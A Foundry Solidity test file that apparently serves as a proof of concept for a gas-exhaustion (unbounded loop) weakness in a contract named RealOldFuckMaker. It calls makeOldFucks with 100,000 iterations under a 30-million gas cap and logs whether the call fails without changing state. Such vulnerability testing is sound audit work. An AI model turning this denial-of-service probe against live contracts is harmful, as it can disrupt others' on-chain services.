// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xf2570186500a46986f3139f65afedc2afe4f445d.sol";

contract RealOldFuckMakerGasTest is Test {
    RealOldFuckMaker target;
    uint32 constant LARGE_ITERATIONS = 100000;
    uint constant GAS_LIMIT = 30_000_000;
    
    function setUp() public {
        target = new RealOldFuckMaker();
    }

    function testMakeOldFucksExceedsGasLimit() public {
        console2.log("--- BEFORE-Trigger Call ---");
        // Record initial state
        uint256 totalRewardsBefore = target.totalRewards();
        uint256 totalFucksMadeBefore = target.totalFucksMade();
        uint256 userFucksBefore = target.userFucks(address(this));
        
        // Log initial state
        console2.log("Initial totalRewards:", totalRewardsBefore);
        console2.log("Initial totalFucksMade:", totalFucksMadeBefore);
        console2.log("Initial userFucks (test contract):", userFucksBefore);

        console2.log("--- Trigger Call ---");
        // Attempt gas-exhausting call
        address targetAddr = address(target);
        (bool success, ) = targetAddr.call{gas: GAS_LIMIT}(
            abi.encodeWithSignature("makeOldFucks(uint32)", LARGE_ITERATIONS)
        );
        
        console2.log("Call outcome:", success ? "SUCCESS" : "FAILED (expected)");
        console2.log("--- AFTER-Trigger Call ---");
        
        // Capture post-call state
        uint256 totalRewardsAfter = target.totalRewards();
        uint256 totalFucksMadeAfter = target.totalFucksMade();
        uint256 userFucksAfter = target.userFucks(address(this));
        
        // Log post-call state
        console2.log("Post-call totalRewards:", totalRewardsAfter);
        console2.log("Post-call totalFucksMade:", totalFucksMadeAfter);
        console2.log("Post-call userFucks (test contract):", userFucksAfter);

        // Verify call failure
        assertFalse(success, "Call should fail due to gas limit");
        
        // Compare and log state differences
        bool rewardsUnchanged = totalRewardsBefore == totalRewardsAfter;
        bool fucksMadeUnchanged = totalFucksMadeBefore == totalFucksMadeAfter;
        bool userFucksUnchanged = userFucksBefore == userFucksAfter;
        
        console2.log("State differences:");
        console2.log("- totalRewards changed:", !rewardsUnchanged);
        console2.log("- totalFucksMade changed:", !fucksMadeUnchanged);
        console2.log("- userFucks changed:", !userFucksUnchanged);
        
        // Evaluate vulnerability existence
        bool exploitSuccess = rewardsUnchanged && fucksMadeUnchanged && userFucksUnchanged;
        if (exploitSuccess) {
            console2.log("Vulnerability Exists: Function call exceeded gas limit with no state changes");
        } else {
            console2.log("Vulnerability not Exist: State modified despite call failure");
        }
    }
}